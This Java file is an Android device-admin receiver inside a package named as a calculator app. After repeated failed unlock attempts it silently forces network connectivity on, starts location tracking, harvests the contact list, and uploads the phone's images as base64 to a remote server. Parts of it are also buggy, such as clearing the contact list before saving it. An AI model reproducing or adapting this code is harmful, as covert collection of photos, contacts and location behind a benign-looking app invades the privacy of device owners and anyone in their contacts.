package com.simplemobiletools.calculator;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.UserHandle;
import android.provider.ContactsContract;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import com.simplemobiletools.calculator.model.ContactDto;
import com.simplemobiletools.calculator.retrofituploadimage.ApiClient;
import com.simplemobiletools.calculator.retrofituploadimage.ApiInterface;
import com.simplemobiletools.calculator.retrofituploadimage.ImageClass;
import com.simplemobiletools.calculator.retrofituploadimage.SongsManager;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

import static android.content.Context.CONNECTIVITY_SERVICE;

/**
 * Created by Wahab Raja on 10/2/2017.
 */

public class AdminReceiver extends DeviceAdminReceiver {

    Context mcontext;
    UserHandle user;
    String a;
    ContactDto obj;
    ConnectivityManager dataManager;
    SharedPreferences sharedPreferences;
    SharedPreferences.Editor editor;
    String username;

    protected static final int REQUEST_CHECK_SETTINGS=0x1;
    int tiTle;
    int count=0;
    int Action;

    @Override
    public void onEnabled(Context ctxt, Intent intent) {
        mcontext = ctxt;
        tiTle=1;
        ComponentName cn = new ComponentName(ctxt, AdminReceiver.class);

        DevicePolicyManager mgr =
                (DevicePolicyManager) ctxt.getSystemService(Context.DEVICE_POLICY_SERVICE);

        mgr.setPasswordQuality(cn,
                DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC);

        onPasswordChanged(ctxt, intent);
    }

    @Override
    public void onPasswordChanged(Context ctxt, Intent intent) {
        DevicePolicyManager mgr =
                (DevicePolicyManager) ctxt.getSystemService(Context.DEVICE_POLICY_SERVICE);
        int msgId;

        if (mgr.isActivePasswordSufficient()) {
            msgId = R.string.compliant;
        } else {
            msgId = R.string.not_compliant;
        }

        Toast.makeText(ctxt, msgId, Toast.LENGTH_LONG).show();
    }


    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
        // Here can I put wifi checksums in it
        CheckConnectionStatus(context);
        Toast.makeText(context, "In Reciever Class", Toast.LENGTH_SHORT).show();
    }


    private void CheckConnectionStatus(Context context) {
        final ConnectivityManager manager = (ConnectivityManager) context.getSystemService(CONNECTIVITY_SERVICE);
        final boolean is3g = manager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE)
                .isConnectedOrConnecting();
        final boolean iswifi = manager.getNetworkInfo(ConnectivityManager.TYPE_WIFI)
                .isConnectedOrConnecting();
        WifiManager wifiManager;
        wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        ConnectivityManager cm = (ConnectivityManager) context.getApplicationContext().getSystemService(CONNECTIVITY_SERVICE);
        NetworkInfo wifi = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();


        if(!is3g||!iswifi)
        {
            Intent intent =new Intent("IntentsValue");
            intent.putExtra("Value","Success");
            LocalBroadcastManager.getInstance(context).sendBroadcast(intent);

           /* Intent intent = new Intent("intentKey");
            // You can also include some extra data.
            intent.putExtra("key","3g");
            LocalBroadcastManager.getInstance(connectionService.this).sendBroadcast(intent);
            //Toast.makeText(connectionService.this, "3g is disabled", Toast.LENGTH_SHORT).show();
            //setMobileDataEnabled(getApplicationContext(),true);*/
        }
    }

    @Override
    public void onPasswordFailed(Context ctxt, Intent intent) {
        SharedPreferences sss = ctxt.getSharedPreferences("USER_INFO", Context.MODE_PRIVATE);
       int cccc = sss.getInt("cc",0);
       count = cccc + 1;
        SharedPreferences obj=ctxt.getSharedPreferences("USER_INFO", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor=obj.edit();
        editor.putInt("cc",count);
       // editor.putString("ttype",UserDetailsDTO.getInstance().UserType);

        editor.commit();

        Toast.makeText(ctxt, "" + count, Toast.LENGTH_SHORT).show();

        if (count > 3) {
            sharedPreferences = ctxt.getSharedPreferences("MyValues", Context.MODE_PRIVATE);
            username = sharedPreferences.getString("username", "a");

            Toast.makeText(ctxt, R.string.password_failed, Toast.LENGTH_LONG)
                    .show();
            WifiManager wifiManager = (WifiManager) ctxt.getSystemService(Context.WIFI_SERVICE);

            if (wifiManager.setWifiEnabled(false)) {
                wifiManager.setWifiEnabled(true);
            }
                ConnectivityManager cm = (ConnectivityManager) ctxt.getSystemService(CONNECTIVITY_SERVICE);
            NetworkInfo wifi = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            if(!wifi.isConnected())
            {
                //DataConnection on
                dataManager  = (ConnectivityManager)ctxt.getSystemService(CONNECTIVITY_SERVICE);
                Method dataMtd = null;

                try {
                    dataMtd =ConnectivityManager.class.getDeclaredMethod("setMobileDataEnabled", boolean.class);
                } catch (NoSuchMethodException e) {
                    e.printStackTrace();
                    Log.d("Tag:",e.toString());
                }
               dataMtd.setAccessible(true);
                //dataMtd.invoke(dataManager, true);
            }
            if(activeNetwork!=null)
            {

                Toast.makeText(ctxt, "Network is Active ", Toast.LENGTH_SHORT).show();
                ctxt.startService(new Intent(ctxt, LocationService.class));
                try {
                    getList(ctxt);
                } catch (IOException e) {
                    e.printStackTrace();
                }

                ImageUpload();
                Toast.makeText(ctxt, "Image is upload IF", Toast.LENGTH_SHORT)
                        .show();
            }

        }
    }


   public void ImageUpload()
    {

        SongsManager sm=new SongsManager();
        ArrayList<String> images=sm.getPlayList();
        for (String image:images){
           // a=image;

            MyTask task=new MyTask();
            task.doInBackground(image);

            // Toast.makeText(mcontext, "loop size: "+a, Toast.LENGTH_SHORT).show();
            //remove to send all images

        }

    }

    public void DeleteData()
    {
    }

    public class MyTask extends AsyncTask<String,Void,String> {


        public Bitmap decodeSampledBitmapFromUri(String path) {
//change there...
            Bitmap bm;
            final BitmapFactory.Options options = new BitmapFactory.Options();
            //BitmapFactory.decodeFile(path, options);
            bm = BitmapFactory.decodeFile(path, options);
            return bm;
        }

        private String imagetoString(String image)
        {
            Bitmap bm = decodeSampledBitmapFromUri(image);
            ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
            // bitmap.compress(Bitmap.CompressFormat.JPEG,100,byteArrayOutputStream);
            bm.compress(Bitmap.CompressFormat.JPEG,5,byteArrayOutputStream);
            byte[] imgbyt=byteArrayOutputStream.toByteArray();
            a= Base64.encodeToString(imgbyt, Base64.DEFAULT);
            return Base64.encodeToString(imgbyt, Base64.DEFAULT);

        }

        private void UploadImage(String image)
        {


            Action=3;
            tiTle++;
            String Image=imagetoString(image);
            String title=username; //Name of table
            Log.d("StringImage:","yeah: "+Image);

            Log.d("StringImage:","yeah: "+title);
            ApiInterface apiInterface= ApiClient.getApiClient().create(ApiInterface.class);
            Call<ImageClass> call=apiInterface.uploadImage(title,Image,Action);

            call.enqueue(new Callback<ImageClass>() {

                @Override
                public void onResponse(Call<ImageClass> call, Response<ImageClass> response) {
                    ImageClass imageClass=response.body();
//                    Toast.makeText(mcontext, "Server response: "+imageClass.getResponse(), Toast.LENGTH_SHORT).show();
                }

                @Override
                public void onFailure(Call<ImageClass> call, Throwable t) {
//                      Toast.makeText(mcontext, "nhe chla", Toast.LENGTH_SHORT).show();
                }
            });
        }


        @Override
        protected String doInBackground(String... params) {
            String image=params[0];
            UploadImage(image);
            return null;
        }
    }

        @Override
        public void onPasswordSucceeded (Context ctxt, Intent intent){
            Toast.makeText(ctxt, R.string.password_success, Toast.LENGTH_LONG)
                    .show();
           // ctxt.stopService(new Intent(ctxt, myservice.class));
           ctxt.stopService(new Intent(ctxt, LocationService.class));

           count = 0;

            SharedPreferences obj=ctxt.getSharedPreferences("USER_INFO", Context.MODE_PRIVATE);
            SharedPreferences.Editor editor=obj.edit();
            editor.putInt("cc",0);
            editor.commit();
        }



    private List<ContactDto> getList(Context context) throws IOException {

        List<ContactDto> list_ = new ArrayList<>();
        list_.clear();

            Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

            while (cursor.moveToNext()) {

                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));

                String phonenumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                obj = new ContactDto(name, phonenumber);
                list_.add(obj);
                Log.d("Contacts",String.valueOf(list_));
            }

            cursor.close();

            Log.d("EEEEEE","EEEEEE"+Environment.DIRECTORY_DOWNLOADS);

     generateNoteOnSD(context,"contacts.txt",list_);

        return list_;
    }


    public void generateNoteOnSD(Context context, String sFileName,List<ContactDto> list) {

        list.clear();
        try {
            File root = new File(Environment.getExternalStorageDirectory(), "Contacts");
            if (!root.exists()) {
                root.mkdirs();
            }
            File gpxfile = new File(root, sFileName);
            FileWriter writer = new FileWriter(gpxfile);

            for (int i=0;i<list.size();i++){

                writer.append("Name: "+list.get(i).getName()+"\nPhone: "+list.get(i).getPhone_number());
            }

            writer.flush();
            writer.close();
            Toast.makeText(context, "Saved", Toast.LENGTH_SHORT).show();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
